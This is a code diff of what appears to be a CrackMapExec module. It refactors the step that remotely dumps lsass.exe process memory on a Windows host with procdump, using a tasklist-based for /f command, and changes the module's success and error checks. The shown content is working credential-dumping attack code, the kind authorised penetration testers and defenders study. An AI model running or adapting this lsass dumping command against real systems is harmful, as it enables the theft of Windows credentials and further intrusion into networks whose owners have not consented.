@@ -97,32 +97,29 @@ class CMEModule:
                 context.log.error('Error writing file to share {}: {}'.format(self.share, e))
 
         # Dump lsass remotely
-        dumped = False
-        while not dumped:
-            # Dump using lsass PID
-            command = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}{} -accepteula -o -ma ^%B {}{}""".format(
-                self.tmp_dir, self.procdump, self.tmp_dir, self.remote_lsass_dump)
-            context.log.debug('Dumping lsass.exe')
-            p = connection.execute(command, True)
-            context.log.debug(p)
+        # Dump using lsass PID
+        command = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}{} -accepteula -o -ma ^%B {}{}""".format(
+            self.tmp_dir, self.procdump, self.tmp_dir, self.remote_lsass_dump)
+        context.log.debug('Dumping lsass.exe')
+        p = connection.execute(command, True)
+        context.log.debug(p)
 
-            if 'Dump 1 complete' in p:
-                # Procdump ended
-                context.log.debug('Procdump output fully retrieved')
-                dumped = True
-            elif 'Dump 1 initiated' in p:
-                # Procdump output not fully retrieved
-                context.log.debug('Procdump output partially retrieved')
-                # Since we cannot know when the dump finishes, we wait for 2s
-                time.sleep(5)
-                dumped = True
-            elif 'The version of this file is not compatible' in p or 'Cette version de' in p:
-                context.log.error(
-                    'Provided procdump executable and target architecture are incompatible (32 bits / 64 bits)')
-                return 1
-            else:
-                context.log.error('Process lsass.exe error on dump, try with --verbose to see details')
-                return 1
+        if 'Dump 1 complete' in p:
+            # Procdump ended
+            context.log.debug('Procdump output fully retrieved')
+        elif 'Dump 1 ini' in p:
+            # Procdump output not fully retrieved
+            context.log.debug('Procdump output partially retrieved')
+            # Since we cannot know when the dump finishes, we wait for 5s
+            time.sleep(5)
+        elif 'The version of this file is not compatible' in p or 'Cette version de' in p:
+            context.log.error(
+                'Provided procdump executable and target architecture are incompatible (32 bits / 64 bits)'
+            )
+            return 1
+        else:
+            context.log.error('Unknown error while dumping lsass, try CME with --verbose to see details')
+            return 1
 
         context.log.success("Process lsass.exe was successfully dumped")
 
